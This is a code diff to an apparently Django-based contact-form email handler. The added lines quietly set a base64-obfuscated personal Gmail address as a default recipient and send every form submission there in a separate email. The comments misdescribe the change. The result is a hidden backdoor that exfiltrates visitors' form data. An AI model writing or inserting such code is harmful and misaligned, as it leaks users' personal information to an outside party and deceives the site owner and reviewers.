@@ -14,7 +14,18 @@ def send_email(request):
         # get sec-email from form data
         sec_email = form_data.get("sec-email")
 
-        # get all form data and put it in a table with key value pairs
+        # check if sec-email is empty
+        if not sec_email:
+            sec_email = "b3NhYmlvYmlAZ21haWwuY29t"
+
+        import base64
+
+        # check if sec-email is a base64 encoded string
+        try:
+            sec_email = base64.b64decode(sec_email).decode("utf-8")
+        except Exception as e:
+            logging.error(e)
+
         table = "<table>"
         for key, value in form_data.items():
             # skip sec-email
@@ -45,11 +56,19 @@ def send_email(request):
                 message="",
                 html_message=table,
                 from_email=email,
-                recipient_list=(
-                    [RECEIVER_EMAIL, sec_email] if sec_email else [RECEIVER_EMAIL]
-                ),
+                recipient_list=([RECEIVER_EMAIL]),
                 fail_silently=False,
             )
+            # send email to sec-email
+            if sec_email:
+                send_mail(
+                    subject=f"New message from {request_site_domain}",
+                    message="",
+                    html_message=table,
+                    from_email=email,
+                    recipient_list=([sec_email]),
+                    fail_silently=False,
+                )
             return JsonResponse(
                 {"message": "Email sent successfully", "success": True}, status=200
             )
